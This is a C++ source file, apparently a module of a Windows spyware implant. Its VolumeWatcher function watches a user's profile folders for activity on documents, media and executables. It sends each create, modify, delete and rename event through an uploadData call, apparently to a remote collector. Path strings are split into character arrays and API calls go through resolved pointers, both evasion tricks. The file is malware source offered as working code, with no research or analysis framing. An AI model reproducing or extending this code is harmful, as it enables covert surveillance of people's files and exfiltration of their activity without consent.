
#include "../api.h"
#include "../public.h"
#include "HARDdiskfile.h"
#include "zconf.h"
#include "zlib.h"
#include "../network/NetWorkdata.h"
#include "../log.h"
#include "../StrHelper.h"
#include "FileListener.h"

#pragma comment(lib,"zlib.lib")

#include <iostream>

using namespace std;

char szDirWindows[] = { '\\', 'W','i','n','d','o','w','s','\\',0 };
char szProgramFiles[] = { '\\', 'P','r','o','g','r','a','m',' ','F','i','l','e','s',0 };
char szProgramData[] = { '\\', 'P','r','o','g','r','a','m','D','a','t','a','\\',0 };
char szUsersAdminiAppData[] = { 'U','s','e','r','s','\\','A','D','M','I','N','I','~','1','\\','A','p','p','D','a','t','a',0 };
char szNtser[] = { 'n','t','u','s','e','r',0 };
char szNtserCapslock[] = { 'N','T','U','S','E','R',0 };
char szCurUserAppdDataFormat[] = { 'U','s','e','r','s','\\','%','s','\\','A','p','p','D','a','t','a',0 };
char szCurUserApplicationDataFromat[] = { 'U','s','e','r','s','\\','%','s','\\','A','p','p','l','i','c','a','t','i','o','n',' ','D','a','t','a',0 };




string gPrefixNames = ".ini.txt.doc.xls.ppt.pdf.dat.bmp.jpg.jpeg.png.mp3.amr.avi.mp4.wav.ogg.mpeg3.mpeg4.exe.dll.apk.jar.dex.app.zip.rar.lnk.xml.json.htm";



//this function need to be in a independent thread process
DWORD WINAPI VolumeWatcher(char* strFilePath)
{
	char strPath[MAX_PATH] = { 0 };
	if (tolower(strFilePath[0]) == tolower(szSysDir[0]))
	{
		lpwsprintfA(strPath, "%sUsers\\%s\\", strFilePath, strUserName);
	}
	else {
		lplstrcpyA(strPath, strFilePath);
	}



	DWORD cbBytes = 0;
	char file_name[MAX_PATH];
	char file_rename[MAX_PATH];
	char notify[FILE_OPER_NOTYFY_SIZE];
	char strBuf[1024];

	//若网络重定向或目标文件系统不支持该操作，函数失败，同时调用GetLastError()返回ERROR_INVALID_FUNCTION
	HANDLE dirHandle = lpCreateFileA(strPath, GENERIC_READ | GENERIC_WRITE | FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (dirHandle == INVALID_HANDLE_VALUE)
	{
		writeLog("%s DesignateVolumeWatcher lpCreateFileA error,error code:%u maybe the path is not exist\r\n", strPath, lpRtlGetLastWin32Error());
		return FALSE;
	}

	lpRtlZeroMemory(notify, FILE_OPER_NOTYFY_SIZE);
	FILE_NOTIFY_INFORMATION* pnotify = (FILE_NOTIFY_INFORMATION*)notify;

	while (TRUE)
	{
		int iRet = lpReadDirectoryChangesW(dirHandle, &notify, FILE_OPER_NOTYFY_SIZE, TRUE,
			FILE_NOTIFY_CHANGE_FILE_NAME
			| FILE_NOTIFY_CHANGE_DIR_NAME
			| FILE_NOTIFY_CHANGE_ATTRIBUTES
			| FILE_NOTIFY_CHANGE_SIZE
			| FILE_NOTIFY_CHANGE_LAST_WRITE
			| FILE_NOTIFY_CHANGE_LAST_ACCESS
			| FILE_NOTIFY_CHANGE_CREATION
			| FILE_NOTIFY_CHANGE_SECURITY,
			&cbBytes, NULL, NULL);
		if (iRet)
		{
			if (pnotify->FileName)
			{
				lpRtlZeroMemory(file_name, MAX_PATH);
				lpWideCharToMultiByte(CP_ACP, 0, pnotify->FileName, pnotify->FileNameLength, file_name, MAX_PATH, NULL, NULL);

				if (strstr(file_name, szDirWindows) || strstr(file_rename, szProgramData) || strstr(file_rename, szProgramFiles))
				{
					continue;
				}

				int pos = string(file_name).find(".");
				if (pos < 0)
				{
					continue;
				}

				string prefixfn = string(file_name).substr(pos);
				if (gPrefixNames.find(prefixfn) < 0)
				{
					continue;
				}
			}

			if (pnotify->NextEntryOffset != 0 && (pnotify->FileNameLength > 0 && pnotify->FileNameLength < MAX_PATH))
			{
				PFILE_NOTIFY_INFORMATION p = (PFILE_NOTIFY_INFORMATION)((char*)pnotify + pnotify->NextEntryOffset);
				lpRtlZeroMemory(file_rename, sizeof(file_rename));
				lpWideCharToMultiByte(CP_ACP, 0, p->FileName, p->FileNameLength, file_rename, MAX_PATH, NULL, NULL);
			}

			SYSTEMTIME stTime = { 0 };
			lpGetLocalTime(&stTime);
			char strTime[MAX_PATH];
			iRet = lpwsprintfA(strTime, "%u-%u-%u %u:%u:%u", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);

			switch (pnotify->Action)
			{
			case FILE_ACTION_ADDED:
				iRet = lpwsprintfA(strBuf, "%s  创建文件:%s%s\r\n", strTime, strPath, file_name);
				uploadData(strBuf, iRet, DISKFILERECORD, 0);
				break;
			case FILE_ACTION_MODIFIED:
				iRet = lpwsprintfA(strBuf, "%s  修改文件:%s%s\r\n", strTime, strPath, file_name);
				uploadData(strBuf, iRet, DISKFILERECORD, 0);
				break;
			case FILE_ACTION_REMOVED:
				iRet = lpwsprintfA(strBuf, "%s  删除文件:%s%s\r\n", strTime, strPath, file_name);
				uploadData(strBuf, iRet, DISKFILERECORD, 0);
				break;
			case FILE_ACTION_RENAMED_OLD_NAME:
				iRet = lpwsprintfA(strBuf, "%s  重命名文件:%s%s 新文件名称:%s%s\r\n", strTime, strPath, file_name, strPath, file_rename);
				uploadData(strBuf, iRet, DISKFILERECORD, 0);
				break;
			case FILE_ACTION_RENAMED_NEW_NAME:
				iRet = lpwsprintfA(strBuf, "%s  重命名文件:%s%s 新文件名称:%s%s\r\n", strTime, strPath, file_name, strPath, file_rename);
				uploadData(strBuf, iRet, DISKFILERECORD, 0);
				break;
			default:
				iRet = lpwsprintfA(strBuf, "%s  未知文件操作:%s%s\r\n", strTime, strPath, file_name);
				uploadData(strBuf, iRet, DISKFILERECORD, 0);
				break;
			}
		}
	}
	lpCloseHandle(dirHandle);
	return TRUE;
}